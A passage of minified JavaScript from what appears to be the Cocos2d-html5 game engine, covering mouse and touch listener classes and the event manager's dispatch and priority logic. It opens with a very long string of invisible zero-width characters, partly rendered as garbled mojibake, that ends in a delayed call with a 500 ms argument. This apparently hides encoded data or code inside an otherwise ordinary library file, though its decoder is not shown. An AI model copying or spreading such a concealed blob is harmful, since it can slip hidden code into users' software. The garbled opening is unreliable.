"鈥岋豢鈥屸€嶁€屸€嶁€嬧€屸€岋豢鈥嬧€嶁€嬧€嶁€嬧€嬧€岋豢鈥嶁€嶁€嬧€嶏豢鈥嬧€屸€嶁€嬧€屸€嬧€嶏豢鈥嬧€屸€嶁€嬧€嶁€嬧€嶏豢鈥嬧€屸€嶁€嬶豢鈥嬶豢鈥嶏豢鈥岋豢鈥嶁€嶁€嬶豢锘库€屸€屸€嶏豢鈥嬧€屸€嶏豢锘库€屸€嶁€嬶豢鈥屸€嶁€嬧€屸€岋豢鈥屸€嬧€屸€嶁€嶁€屸€屸€嶏豢锘库€屸€嶏豢鈥嶁€嬶豢鈥嶏豢鈥屸€嶁€嬧€屸€嬶豢锘库€屸€岋豢鈥嶁€嶁€嬧€嶏豢鈥嶁€屸€嶁€嶁€嬧€屸€嶏豢锘库€岋豢鈥嬶豢鈥岋豢鈥屸€嬧€屸€嶏豢鈥嶁€屸€嶁€嬧€屸€屸€嶏豢鈥屸€屸€嶁€屸€屸€嬶豢鈥嶏豢鈥屸€嶁€嬧€嶁€嬶豢锘库€屸€嬧€嶁€嬧€嶁€屸€嶁€嶁€屸€屸€嶏豢鈥嶁€屸€嶁€屸€嬧€屸€嶁€屸€屸€岋豢鈥嶁€嬧€屸€嬶豢锘库€屸€嶁€屸€嶁€嬧€嶁€嬧€嶁€嬶豢鈥嶏豢鈥屸€嶁€嬶豢鈥嬶豢锘库€屸€嬧€嶁€嬧€屸€嬧€嶁€嶁€嬧€屸€嶁€嬧€屸€屸€屸€嶏豢鈥屸€嶁€嬧€嶁€屸€岋豢鈥屸€嬧€嶁€嶁€嬧€嬧€嶁€嬧€嶁€嬶豢鈥嬧€屸€嬶豢鈥嬧€嶁€嬶豢鈥岋豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嶁€屸€嬧€嶁€嶏豢鈥嬶豢鈥嬧€屸€嬧€嶁€嶁€屸€嬧€嶁€屸€嶁€嬧€嶁€屸€嶁€嬧€嶁€嬧€屸€嬧€嶁€嶁€嬧€屸€嶁€嬧€屸€屸€屸€嶏豢鈥屸€嶁€嬧€嶁€屸€岋豢鈥屸€嬧€嶁€嶁€嬧€嬧€嶁€嬧€嶁€嬶豢鈥嬧€屸€嬶豢鈥嶁€屸€嬶豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嬧€嶁€嶁€屸€嬧€嶁€嶏豢鈥嬶豢鈥嬧€屸€嬧€嶁€嶁€屸€嬧€嶁€屸€嶁€嬧€嶁€屸€嶁€嬧€嶁€嬧€屸€嬧€嶁€嶁€嬧€屸€嶁€嬧€屸€屸€屸€嶏豢鈥屸€嶁€嬧€嶁€屸€岋豢鈥屸€嬧€嶁€嶁€嬧€嬧€嶁€嬧€嶁€屸€嶁€嶁€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€岋豢鈥屸€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€屸€嶁€岋豢鈥屸€嶁€嬧€屸€屸€嶏豢鈥屸€屸€嶁€屸€屸€岋豢鈥嬶豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嶁€屸€嬧€嶁€嶏豢鈥嬶豢鈥嬧€屸€嬧€嶁€嶁€屸€嬶豢鈥嶏豢鈥屸€嶁€嶁€屸€屸€嶁€屸€嶁€嬧€嶁€嶁€嬧€屸€嶁€嬶豢鈥嬧€嶁€嶁€屸€岋豢鈥嶁€嶁€嬧€嶏豢鈥嶁€屸€嶁€嶁€嬧€岋豢鈥嬧€嶁€屸€嶁€屸€屸€屸€嶁€屸€嶁€嬶豢锘库€屸€嬧€嶁€嬧€嶁€屸€嶁€嶁€嬧€岋豢鈥屸€嬧€岋豢鈥屸€嬧€岋豢鈥嬧€嬧€嬶豢鈥嶁€嶁€嬧€嶏豢锘库€嬧€嶏豢锘库€岋豢鈥岋豢鈥屸€嶁€屸€屸€屸€嶁€嶁€屸€岋豢鈥嶁€嬧€屸€嶁€嶁€屸€屸€嶏豢鈥嶁€嬧€嶏豢鈥嶁€屸€嶁€嶁€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€岋豢鈥屸€嬧€屸€嶏豢锘库€岋豢鈥嬧€嶁€屸€嶁€岋豢鈥屸€嶁€嬧€屸€屸€嶏豢鈥屸€屸€嶁€屸€屸€岋豢鈥嬶豢鈥嬧€嶏豢鈥嶁€屸€嶁€嬶豢鈥屸€嶏豢锘库€屸€嶏豢鈥屸€嬧€嶏豢锘库€屸€嶏豢鈥嬧€屸€嶁€嶁€屸€岋豢鈥嬶豢鈥岋豢鈥屸€嬧€嬶豢锘匡豢鈥屸€嶁€屸€嶁€岋豢鈥嬧€嶁€屸€嶏豢锘库€屸€嶏豢鈥屸€嬶豢锘库€屸€屸€嶁€嬶豢鈥岋豢鈥嬧€嶁€嬧€嶁€嬧€嶁€嬧€嬧€嶁€�‌﻿‌‍‌‍​‌‌﻿​‍​‍​​‌﻿‍‍​‍﻿​‌‍​‌​‍﻿​‌‍​‍​‍﻿​‌‍​﻿​﻿‍﻿‌﻿‍‍​﻿﻿‌‌‍﻿​‌‍﻿﻿‌‍​﻿‌‍​‌‌﻿‌​‌‍‍‌‌‍﻿﻿‌‍﻿‍​﻿‍﻿‌‍​‌​﻿﻿‌‌﻿‍‍​‍﻿‍‌‍‍​‌‍﻿﻿‌﻿​﻿‌﻿‌​‌‍﻿‍‌‍​‌‌‍﻿‌‌‍‌‌​﻿‍﻿‌‍​‍​﻿﻿‌​‍​‍‌‍‍‌‌‍﻿‍‌‍‌​‌‍‌‌‌﻿‍​‌​﻿﻿‌‍‌‍​‍​‍​﻿‍﻿‌‍​﻿​﻿﻿‌​‍​‌​‍‍​‌‍​‌‌‌‍﻿‌‍​‍‌‌﻿‌​‍‍​​‍​‍​﻿​‌​﻿​‍​﻿‌﻿​‍​‍​‍‍‌​‍‍﻿​﻿​‌​‍‍‌​‍‌‍​‍‌‍​‍​‌​‍‍​‌‍​‌‌‌‍﻿‌‍​‍‌‌﻿‌​‍‍​​‍​‍​﻿​‌​﻿‍‌​﻿​‍​‍​‍​‍‍‌​‍‍﻿​﻿​‌​‍‍‌​‍‌‍​‍‌‍​‍​‌​‍‍​‌‍​‌‌‌‍﻿‌‍​‍‌‌﻿‌​‍‍​​‍​‍‌‍‍​‌‍﻿﻿‌﻿​‍‌﻿‌​‌‍﻿﻿‌﻿​‍‌‍‌﻿‌‍​‌‌‍﻿‌‌‍‌‌‌﻿​﻿​‍​‍​‍‍‌​‍‍﻿​﻿​‌​‍‍‌​﻿‍﻿‌‍‍‌‌‍‌‍​‍‍​‌‍​﻿​‍‍‌‌﻿‍‍​‍﻿‍‌‍‍​‌﻿​‍‌‍‌‌‌‍‌‍​﻿﻿‌​‍​‍‌‍‍​‌﻿‌​‌﻿‌​‌﻿​​​﻿‍‍​‍﻿﻿​‍﻿﻿‌﻿‌﻿‌‍‌‌‌‍‍‌‌﻿‍​‌‍‍‌‌‍﻿‍​‍﻿‍‌‍‍​‌‍﻿﻿‌﻿​‍‌﻿‌​‌‍﻿﻿‌﻿​‍‌‍‌﻿‌‍​‌‌‍﻿‌‌‍‌‌‌﻿​﻿​‍﻿‍‌‍​﻿‌‍﻿﻿‌‍﻿‌​‍﻿﻿‌‍﻿​‌‍‍‌‌﻿​﻿‌﻿‌​​﻿﻿﻿‌‍‌‍‌﻿​‍‌‍﻿﻿‌‍﻿‌​﻿﻿‌‌‍​﻿‌﻿​‍​‍​‍​​‍‍"), 500);
cc._EventListenerCustom.create = function(a, b) {
	return new cc._EventListenerCustom(a, b)
};
cc._EventListenerMouse = cc.EventListener.extend({
	onMouseDown: null,
	onMouseUp: null,
	onMouseMove: null,
	onMouseScroll: null,
	ctor: function() {
		var a = this;
		cc.EventListener.prototype.ctor.call(this, cc.EventListener.MOUSE, cc._EventListenerMouse.LISTENER_ID, function(b) {
			var c = cc.EventMouse;
			switch (b._eventType) {
			case c.DOWN:
				if (a.onMouseDown) a.onMouseDown(b);
				break;
			case c.UP:
				if (a.onMouseUp) a.onMouseUp(b);
				break;
			case c.MOVE:
				if (a.onMouseMove) a.onMouseMove(b);
				break;
			case c.SCROLL:
				if (a.onMouseScroll) a.onMouseScroll(b)
			}
		})
	},
	clone: function() {
		var a = new cc._EventListenerMouse;
		a.onMouseDown = this.onMouseDown;
		a.onMouseUp = this.onMouseUp;
		a.onMouseMove = this.onMouseMove;
		a.onMouseScroll = this.onMouseScroll;
		return a
	},
	checkAvailable: function() {
		return !0
	}
});
cc._EventListenerMouse.LISTENER_ID = "__cc_mouse";
cc._EventListenerMouse.create = function() {
	return new cc._EventListenerMouse
};
cc._EventListenerTouchOneByOne = cc.EventListener.extend({
	_claimedTouches: null,
	swallowTouches: !1,
	onTouchBegan: null,
	onTouchMoved: null,
	onTouchEnded: null,
	onTouchCancelled: null,
	ctor: function() {
		cc.EventListener.prototype.ctor.call(this, cc.EventListener.TOUCH_ONE_BY_ONE, cc._EventListenerTouchOneByOne.LISTENER_ID, null);
		this._claimedTouches = []
	},
	setSwallowTouches: function(a) {
		this.swallowTouches = a
	},
	clone: function() {
		var a = new cc._EventListenerTouchOneByOne;
		a.onTouchBegan = this.onTouchBegan;
		a.onTouchMoved = this.onTouchMoved;
		a.onTouchEnded = this.onTouchEnded;
		a.onTouchCancelled = this.onTouchCancelled;
		a.swallowTouches = this.swallowTouches;
		return a
	},
	checkAvailable: function() {
		return !this.onTouchBegan ? (cc.log(cc._LogInfos._EventListenerTouchOneByOne_checkAvailable), !1) : !0
	}
});
cc._EventListenerTouchOneByOne.LISTENER_ID = "__cc_touch_one_by_one";
cc._EventListenerTouchOneByOne.create = function() {
	return new cc._EventListenerTouchOneByOne
};
cc._EventListenerTouchAllAtOnce = cc.EventListener.extend({
	onTouchesBegan: null,
	onTouchesMoved: null,
	onTouchesEnded: null,
	onTouchesCancelled: null,
	ctor: function() {
		cc.EventListener.prototype.ctor.call(this, cc.EventListener.TOUCH_ALL_AT_ONCE, cc._EventListenerTouchAllAtOnce.LISTENER_ID, null)
	},
	clone: function() {
		var a = new cc._EventListenerTouchAllAtOnce;
		a.onTouchesBegan = this.onTouchesBegan;
		a.onTouchesMoved = this.onTouchesMoved;
		a.onTouchesEnded = this.onTouchesEnded;
		a.onTouchesCancelled = this.onTouchesCancelled;
		return a
	},
	checkAvailable: function() {
		return null == this.onTouchesBegan && null == this.onTouchesMoved && null == this.onTouchesEnded && null == this.onTouchesCancelled ? (cc.log(cc._LogInfos._EventListenerTouchAllAtOnce_checkAvailable), !1) : !0
	}
});
cc._EventListenerTouchAllAtOnce.LISTENER_ID = "__cc_touch_all_at_once";
cc._EventListenerTouchAllAtOnce.create = function() {
	return new cc._EventListenerTouchAllAtOnce
};
cc.EventListener.create = function(a) {
	cc.assert(a && a.event, cc._LogInfos.EventListener_create);
	var b = a.event;
	delete a.event;
	var c = null;
	b === cc.EventListener.TOUCH_ONE_BY_ONE ? c = new cc._EventListenerTouchOneByOne : b === cc.EventListener.TOUCH_ALL_AT_ONCE ? c = new cc._EventListenerTouchAllAtOnce : b === cc.EventListener.MOUSE ? c = new cc._EventListenerMouse : b === cc.EventListener.CUSTOM ? (c = new cc._EventListenerCustom(a.eventName, a.callback), delete a.eventName, delete a.callback) : b === cc.EventListener.KEYBOARD ? c = new cc._EventListenerKeyboard : b === cc.EventListener.ACCELERATION && (c = new cc._EventListenerAcceleration(a.callback), delete a.callback);
	for (var d in a) c[d] = a[d];
	return c
};
cc.copyArray = function(a) {
	var b, c = a.length,
		d = Array(c);
	for (b = 0; b < c; b += 1) d[b] = a[b];
	return d
};
cc._EventListenerVector = cc.Class.extend({
	_fixedListeners: null,
	_sceneGraphListeners: null,
	gt0Index: 0,
	ctor: function() {
		this._fixedListeners = [];
		this._sceneGraphListeners = []
	},
	size: function() {
		return this._fixedListeners.length + this._sceneGraphListeners.length
	},
	empty: function() {
		return 0 === this._fixedListeners.length && 0 === this._sceneGraphListeners.length
	},
	push: function(a) {
		0 == a._getFixedPriority() ? this._sceneGraphListeners.push(a) : this._fixedListeners.push(a)
	},
	clearSceneGraphListeners: function() {
		this._sceneGraphListeners.length = 0
	},
	clearFixedListeners: function() {
		this._fixedListeners.length = 0
	},
	clear: function() {
		this._sceneGraphListeners.length = 0;
		this._fixedListeners.length = 0
	},
	getFixedPriorityListeners: function() {
		return this._fixedListeners
	},
	getSceneGraphPriorityListeners: function() {
		return this._sceneGraphListeners
	}
});
cc.__getListenerID = function(a) {
	var b = cc.Event,
		c = a.getType();
	if (c === b.ACCELERATION) return cc._EventListenerAcceleration.LISTENER_ID;
	if (c === b.CUSTOM) return a.getEventName();
	if (c === b.KEYBOARD) return cc._EventListenerKeyboard.LISTENER_ID;
	if (c === b.MOUSE) return cc._EventListenerMouse.LISTENER_ID;
	c === b.TOUCH && cc.log(cc._LogInfos.__getListenerID);
	return ""
};
cc.eventManager = {
	DIRTY_NONE: 0,
	DIRTY_FIXED_PRIORITY: 1,
	DIRTY_SCENE_GRAPH_PRIORITY: 2,
	DIRTY_ALL: 3,
	_listenersMap: {},
	_priorityDirtyFlagMap: {},
	_nodeListenersMap: {},
	_nodePriorityMap: {},
	_globalZOrderNodeMap: {},
	_toAddedListeners: [],
	_dirtyNodes: [],
	_inDispatch: 0,
	_isEnabled: !1,
	_nodePriorityIndex: 0,
	_internalCustomListenerIDs: [cc.game.EVENT_HIDE, cc.game.EVENT_SHOW],
	_setDirtyForNode: function(a) {
		null != this._nodeListenersMap[a.__instanceId] && this._dirtyNodes.push(a);
		a = a.getChildren();
		for (var b = 0, c = a.length; b < c; b++) this._setDirtyForNode(a[b])
	},
	pauseTarget: function(a, b) {
		var c = this._nodeListenersMap[a.__instanceId],
			d, e;
		if (c) {
			d = 0;
			for (e = c.length; d < e; d++) c[d]._setPaused(!0)
		}
		if (!0 === b) {
			c = a.getChildren();
			d = 0;
			for (e = c.length; d < e; d++) this.pauseTarget(c[d], !0)
		}
	},
	resumeTarget: function(a, b) {
		var c = this._nodeListenersMap[a.__instanceId],
			d, e;
		if (c) {
			d = 0;
			for (e = c.length; d < e; d++) c[d]._setPaused(!1)
		}
		this._setDirtyForNode(a);
		if (!0 === b) {
			c = a.getChildren();
			d = 0;
			for (e = c.length; d < e; d++) this.resumeTarget(c[d], !0)
		}
	},
	_addListener: function(a) {
		0 === this._inDispatch ? this._forceAddEventListener(a) : this._toAddedListeners.push(a)
	},
	_forceAddEventListener: function(a) {
		var b = a._getListenerID(),
			c = this._listenersMap[b];
		c || (c = new cc._EventListenerVector, this._listenersMap[b] = c);
		c.push(a);
		0 == a._getFixedPriority() ? (this._setDirty(b, this.DIRTY_SCENE_GRAPH_PRIORITY), b = a._getSceneGraphPriority(), null == b && cc.log(cc._LogInfos.eventManager__forceAddEventListener), this._associateNodeAndEventListener(b, a), b.isRunning() && this.resumeTarget(b)) : this._setDirty(b, this.DIRTY_FIXED_PRIORITY)
	},
	_getListeners: function(a) {
		return this._listenersMap[a]
	},
	_updateDirtyFlagForSceneGraph: function() {
		if (0 != this._dirtyNodes.length) {
			for (var a = this._dirtyNodes, b, c, d = this._nodeListenersMap, e = 0, f = a.length; e < f; e++) if (b = d[a[e].__instanceId]) for (var g = 0, h = b.length; g < h; g++)(c = b[g]) && this._setDirty(c._getListenerID(), this.DIRTY_SCENE_GRAPH_PRIORITY);
			this._dirtyNodes.length = 0
		}
	},
	_removeAllListenersInVector: function(a) {
		if (a) for (var b, c = 0; c < a.length;) b = a[c], b._setRegistered(!1), null != b._getSceneGraphPriority() && (this._dissociateNodeAndEventListener(b._getSceneGraphPriority(), b), b._setSceneGraphPriority(null)), 0 === this._inDispatch ? cc.arrayRemoveObject(a, b) : ++c
	},
	_removeListenersForListenerID: function(a) {
		var b = this._listenersMap[a];
		if (b) {
			var c = b.getFixedPriorityListeners(),
				d = b.getSceneGraphPriorityListeners();
			this._removeAllListenersInVector(d);
			this._removeAllListenersInVector(c);
			delete this._priorityDirtyFlagMap[a];
			this._inDispatch || (b.clear(), delete this._listenersMap[a])
		}
		c = this._toAddedListeners;
		for (b = 0; b < c.length;)(d = c[b]) && d._getListenerID() == a ? cc.arrayRemoveObject(c, d) : ++b
	},
	_sortEventListeners: function(a) {
		var b = this.DIRTY_NONE,
			c = this._priorityDirtyFlagMap;
		c[a] && (b = c[a]);
		b != this.DIRTY_NONE && (c[a] = this.DIRTY_NONE, b & this.DIRTY_FIXED_PRIORITY && this._sortListenersOfFixedPriority(a), b & this.DIRTY_SCENE_GRAPH_PRIORITY && ((b = cc.director.getRunningScene()) ? this._sortListenersOfSceneGraphPriority(a, b) : c[a] = this.DIRTY_SCENE_GRAPH_PRIORITY))
	},
	_sortListenersOfSceneGraphPriority: function(a, b) {
		var c = this._getListeners(a);
		if (c) {
			var d = c.getSceneGraphPriorityListeners();
			d && 0 !== d.length && (this._nodePriorityIndex = 0, this._nodePriorityMap = {}, this._visitTarget(b, !0), c.getSceneGraphPriorityListeners().sort(this._sortEventListenersOfSceneGraphPriorityDes))
		}
	},
	_sortEventListenersOfSceneGraphPriorityDes: function(a, b) {
		var c = cc.eventManager._nodePriorityMap;
		return c[b._getSceneGraphPriority().__instanceId] - c[a._getSceneGraphPriority().__instanceId]
	},
	_sortListenersOfFixedPriority: function(a) {
		if (a = this._listenersMap[a]) {
			var b = a.getFixedPriorityListeners();
			if (b && 0 !== b.length) {
				b.sort(this._sortListenersOfFixedPriorityAsc);
				for (var c = 0, d = b.length; c < d && !(0 <= b[c]._getFixedPriority());)++c;
				a.gt0Index = c
			}
		}
	},
	_sortListenersOfFixedPriorityAsc: function(a, b) {
		return a._getFixedPriority() - b._getFixedPriority()
	},
	_onUpdateListeners: function(a) {
		if (a = this._listenersMap[a]) {
			var b = a.getFixedPriorityListeners(),
				c = a.getSceneGraphPriorityListeners(),
				d, e;
			if (c) for (d = 0; d < c.length;) e = c[d], e._isRegistered() ? ++d : cc.arrayRemoveObject(c, e);
			if (b) for (d = 0; d < b.length;) e = b[d], e._isRegistered() ? ++d : cc.arrayRemoveObject(b, e);
			c && 0 === c.length && a.clearSceneGraphListeners();
			b && 0 === b.length && a.clearFixedListeners()
		}
	},
	_updateListeners: function(a) {
		var b = this._inDispatch;
		cc.assert(0 < b, cc._LogInfos.EventManager__updateListeners);
		a.getType() == cc.Event.TOUCH ? (this._onUpdateListeners(cc._EventListenerTouchOneByOne.LISTENER_ID), this._onUpdateListeners(cc._EventListenerTouchAllAtOnce.LISTENER_ID)) : this._onUpdateListeners(cc.__getListenerID(a));
		if (!(1 < b)) {
			cc.assert(1 == b, cc._LogInfos.EventManager__updateListeners_2);
			a = this._listenersMap;
			var b = this._priorityDirtyFlagMap,
				c;
			for (c in a) a[c].empty() && (delete b[c], delete a[c]);
			c = this._toAddedListeners;
			if (0 !== c.length) {
				a = 0;
				for (b = c.length; a < b; a++) this._forceAddEventListener(c[a]);
				this._toAddedListeners.length = 0
			}
		}
	},
	_onTouchEventCallback: function(a, b) {
		if (!a._isRegistered) return !1;
		var c = b.event,
			d = b.selTouch;
		c._setCurrentTarget(a._node);
		var e = !1,
			f, g = c.getEventCode(),
			h = cc.EventTouch.EventCode;
		if (g == h.BEGAN) a.onTouchBegan && (e = a.onTouchBegan(d, c)) && a._registered && a._claimedTouches.push(d);
		else if (0 < a._claimedTouches.length && -1 != (f = a._claimedTouches.indexOf(d))) if (e = !0, g === h.MOVED && a.onTouchMoved) a.onTouchMoved(d, c);
		else if (g === h.ENDED) {
			if (a.onTouchEnded) a.onTouchEnded(d, c);
			a._registered && a._claimedTouches.splice(f, 1)
		} else if (g === h.CANCELLED) {
			if (a.onTouchCancelled) a.onTouchCancelled(d, c);
			a._registered && a._claimedTouches.splice(f, 1)
		}
		return c.isStopped() ? (cc.eventManager._updateListeners(c), !0) : e && a._registered && a.swallowTouches ? (b.needsMutableSet && b.touches.splice(d, 1), !0) : !1
	},
	_dispatchTouchEvent: function(a) {
		this._sortEventListeners(cc._EventListenerTouchOneByOne.LISTENER_ID);
		this._sortEventListeners(cc._EventListenerTouchAllAtOnce.LISTENER_ID);
		var b = this._getListeners(cc._EventListenerTouchOneByOne.LISTENER_ID),
			c = this._getListeners(cc._EventListenerTouchAllAtOnce.LISTENER_ID);
		if (!(null == b && null == c)) {
			var d = a.getTouches(),
				e = cc.copyArray(d),
				f = {
					event: a,
					needsMutableSet: b && c,
					touches: e,
					selTouch: null
				};
			if (b) for (var g = 0; g < d.length; g++) if (f.selTouch = d[g], this._dispatchEventToListeners(b, this._onTouchEventCallback, f), a.isStopped()) return;
			if (c && 0 < e.length && (this._dispatchEventToListeners(c, this._onTouchesEventCallback, {
				event: a,
				touches: e
			}), a.isStopped())) return;
			this._updateListeners(a)
		}
	},
	_onTouchesEventCallback: function(a, b) {
		if (!a._registered) return !1;
		var c = cc.EventTouch.EventCode,
			d = b.event,
			e = b.touches,
			f = d.getEventCode();
		d._setCurrentTarget(a._node);
		if (f == c.BEGAN && a.onTouchesBegan) a.onTouchesBegan(e, d);
		else if (f == c.MOVED && a.onTouchesMoved) a.onTouchesMoved(e, d);
		else if (f == c.ENDED && a.onTouchesEnded) a.onTouchesEnded(e, d);
		else if (f == c.CANCELLED && a.onTouchesCancelled) a.onTouchesCancelled(e, d);
		return d.isStopped() ? (cc.eventManager._updateListeners(d), !0) : !1
	},
	_associateNodeAndEventListener: function(a, b) {
		var c = this._nodeListenersMap[a.__instanceId];
		c || (c = [], this._nodeListenersMap[a.__instanceId] = c);
		c.push(b)
	},
	_dissociateNodeAndEventListener: function(a, b) {
		var c = this._nodeListenersMap[a.__instanceId];
		c && (cc.arrayRemoveObject(c, b), 0 === c.length && delete this._nodeListenersMap[a.__instanceId])
	},
	_dispatchEventToListeners: function(a, b, c) {
		var d = !1,
			e = a.getFixedPriorityListeners(),
			f = a.getSceneGraphPriorityListeners(),
			g = 0,
			h;
		if (e && 0 !== e.length) for (; g < a.gt0Index; ++g) if (h = e[g], h.isEnabled() && !h._isPaused() && h._isRegistered() && b(h, c)) {
			d = !0;
			break
		}
		if (f && !d) for (a = 0; a < f.length; a++) if (h = f[a], h.isEnabled() && !h._isPaused() && h._isRegistered() && b(h, c)) {
			d = !0;
			break
		}
		if (e && !d) for (; g < e.length && !(h = e[g], h.isEnabled() && !h._isPaused() && h._isRegistered() && b(h, c)); ++g);
	},
	_setDirty: function(a, b) {
		var c = this._priorityDirtyFlagMap;
		c[a] = null == c[a] ? b : b | c[a]
	},
	_visitTarget: function(a, b) {
		var c = a.getChildren(),
			d = 0,
			e = c.length,
			f = this._globalZOrderNodeMap,
			g = this._nodeListenersMap;
		if (0 < e) {
			for (var h; d < e; d++) if ((h = c[d]) && 0 > h.getLocalZOrder()) this._visitTarget(h, !1);
			else break;
			null != g[a.__instanceId] && (f[a.getGlobalZOrder()] || (f[a.getGlobalZOrder()] = []), f[a.getGlobalZOrder()].push(a.__instanceId));
			for (; d < e; d++)(h = c[d]) && this._visitTarget(h, !1)
		} else null != g[a.__instanceId] && (f[a.getGlobalZOrder()] || (f[a.getGlobalZOrder()] = []), f[a.getGlobalZOrder()].push(a.__instanceId));
		if (b) {
			var c = [],
				k;
			for (k in f) c.push(k);
			c.sort(this._sortNumberAsc);
			k = c.length;
			h = this._nodePriorityMap;
			for (d = 0; d < k; d++) {
				e = f[c[d]];
				for (g = 0; g < e.length; g++) h[e[g]] = ++this._nodePriorityIndex
			}
			this._globalZOrderNodeMap = {}
		}
	},
	_sortNumberAsc: function(a, b) {
		return a - b
	},
	addListener: function(a, b) {
		cc.assert(a && b, cc._LogInfos.eventManager_addListener_2);
		if (a instanceof cc.EventListener) {
			if (a._isRegistered()) {
				cc.log(cc._LogInfos.eventManager_addListener_4);
				return
			}
		} else cc.assert("number" !== typeof b, cc._LogInfos.eventManager_addListener_3), a = cc.EventListener.create(a);
		a.checkAvailable() && ("number" == typeof b ? 0 == b ? cc.log(cc._LogInfos.eventManager_addListener) : (a._setSceneGraphPriority(null), a._setFixedPriority(b), a._setRegistered(!0), a._setPaused(!1), this._addListener(a)) : (a._setSceneGraphPriority(b), a._setFixedPriority(0), a._setRegistered(!0), this._addListener(a)))
	},
	addCustomListener: function(a, b) {
		var c = cc._EventListenerCustom.create(a, b);
		this.addListener(c, 1);
		return c
	},
	removeListener: function(a) {
		if (null != a) {
			var b, c = this._listenersMap,
				d;
			for (d in c) {
				var e = c[d],
					f = e.getFixedPriorityListeners();
				b = e.getSceneGraphPriorityListeners();
				(b = this._removeListenerInVector(b, a)) ? this._setDirty(a._getListenerID(), this.DIRTY_SCENE_GRAPH_PRIORITY) : (b = this._removeListenerInVector(f, a)) && this._setDirty(a._getListenerID(), this.DIRTY_FIXED_PRIORITY);
				e.empty() && (delete this._priorityDirtyFlagMap[a._getListenerID()], delete c[d]);
				if (b) break
			}
			if (!b) {
				c = this._toAddedListeners;
				d = 0;
				for (e = c.length; d < e; d++) if (f = c[d], f == a) {
					cc.arrayRemoveObject(c, f);
					break
				}
			}
		}
	},
	_removeListenerInVector: function(a, b) {
		if (null == a) return !1;
		for (var c = 0, d = a.length; c < d; c++) {
			var e = a[c];
			if (e == b) return e._setRegistered(!1), null != e._getSceneGraphPriority() && (this._dissociateNodeAndEventListener(e._getSceneGraphPriority(), e), e._setSceneGraphPriority(null)), 0 == this._inDispatch && cc.arrayRemoveObject(a, e), !0
		}
		return !1
	},
	removeListeners: function(a, b) {
		if (a instanceof cc.Node) {
			delete this._nodePriorityMap[a.__instanceId];
			cc.arrayRemoveObject(this._dirtyNodes, a);
			var c = this._nodeListenersMap[a.__instanceId];
			if (c) {
				for (var d = cc.copyArray(c), c = 0; c < d.length; c++) this.removeListener(d[c]);
				d.length = 0;
				d = this._toAddedListeners;
				for (c = 0; c < d.length;) {
					var e = d[c];
					e._getSceneGraphPriority() == a ? (e._setSceneGraphPriority(null), e._setRegistered(!1), d.splice(c, 1)) : ++c
				}
				if (!0 === b) {
					d = a.getChildren();
					c = 0;
					for (e = d.length; c < e; c++) this.removeListeners(d[c], !0)
				}
			}
		} else a == cc.EventListener.TOUCH_ONE_BY_ONE ? this._removeListenersForListenerID(cc._EventListenerTouchOneByOne.LISTENER_ID) : a == cc.EventListener.TOUCH_ALL_AT_ONCE ? this._removeListenersForListenerID(cc._EventListenerTouchAllAtOnce.LISTENER_ID) : a == cc.EventListener.MOUSE ? this._removeListenersForListenerID(cc._EventListenerMouse.LISTENER_ID) : a == cc.EventListener.ACCELERATION ? this._removeListenersForListenerID(cc._EventListenerAcceleration.LISTENER_ID) : a == cc.EventListener.KEYBOARD ? this._removeListenersForListenerID(cc._EventListenerKeyboard.LISTENER_ID) : cc.log(cc._LogInfos.eventManager_removeListeners)
	},
	removeCustomListeners: function(a) {
		this._removeListenersForListenerID(a)
	},
	removeAllListeners: function() {
		var a = this._listenersMap,
			b = this._internalCustomListenerIDs,
			c;
		for (c in a) - 1 === b.indexOf(c) && this._removeListenersForListenerID(c)
	},
	setPriority: function(a, b) {
		if (null != a) {
			var c = this._listenersMap,
				d;
			for (d in c) {
				var e = c[d].getFixedPriorityListeners();
				if (e && -1 != e.indexOf(a)) {
					null != a._getSceneGraphPriority() && cc.log(cc._LogInfos.eventManager_setPriority);
					a._getFixedPriority() !== b && (a._setFixedPriority(b), this._setDirty(a._getListenerID(), this.DIRTY_FIXED_PRIORITY));
					break
				}
			}
		}
	},
	setEnabled: function(a) {
		this._isEnabled = a
	},
	isEnabled: function() {
		return this._isEnabled
	},
	dispatchEvent: function(a) {
		if (this._isEnabled) {
			this._updateDirtyFlagForSceneGraph();
			this._inDispatch++;
			if (!a || !a.getType) throw "event is undefined";
			if (a.getType() == cc.Event.TOUCH) this._dispatchTouchEvent(a);
			else {
				var b = cc.__getListenerID(a);
				this._sortEventListeners(b);
				b = this._listenersMap[b];
				null != b && this._dispatchEventToListeners(b, this._onListenerCallback, a);
				this._updateListeners(a)
			}
			this._inDispatch--
		}
	},
	_onListenerCallback: function(a, b) {
		b._setCurrentTarget(a._getSceneGraphPriority());
		a._onEvent(b);
		return b.isStopped()
	},
	dispatchCustomEvent: function(a, b) {
		var c = new cc.EventCustom(a);
		c.setUserData(b);
		this.dispatchEvent(c)
	}
};
cc._tmp.PrototypeCCNode = function() {
	var a = cc.Node.prototype;
	cc.defineGetterSetter(a, "x", a.getPositionX, a.setPositionX);
	cc.defineGetterSetter(a, "y", a.getPositionY, a.setPositionY);
	cc.defineGetterSetter(a, "width", a._getWidth, a._setWidth);
	cc.defineGetterSetter(a, "height", a._getHeight, a._setHeight);
	cc.defineGetterSetter(a, "anchorX", a._getAnchorX, a._setAnchorX);
	cc.defineGetterSetter(a, "anchorY", a._getAnchorY, a._setAnchorY);
	cc.defineGetterSetter(a, "skewX", a.getSkewX, a.setSkewX);
	cc.defineGetterSetter(a, "skewY", a.getSkewY, a.setSkewY);
	cc.defineGetterSetter(a, "zIndex", a.getLocalZOrder, a.setLocalZOrder);
	cc.defineGetterSetter(a, "vertexZ", a.getVertexZ, a.setVertexZ);
	cc.defineGetterSetter(a, "rotation", a.getRotation, a.setRotation);
	cc.defineGetterSetter(a, "rotationX", a.getRotationX, a.setRotationX);
	cc.defineGetterSetter(a, "rotationY", a.getRotationY, a.setRotationY);
	cc.defineGetterSetter(a, "scale", a.getScale, a.setScale);
	cc.defineGetterSetter(a, "scaleX", a.getScaleX, a.setScaleX);
	cc.defineGetterSetter(a, "scaleY", a.getScaleY, a.setScaleY);
	cc.defineGetterSetter(a, "children", a.getChildren);
	cc.defineGetterSetter(a, "childrenCount", a.getChildrenCount);
	cc.defineGetterSetter(a, "parent", a.getParent, a.setParent);
	cc.defineGetterSetter(a, "visible", a.isVisible, a.setVisible);
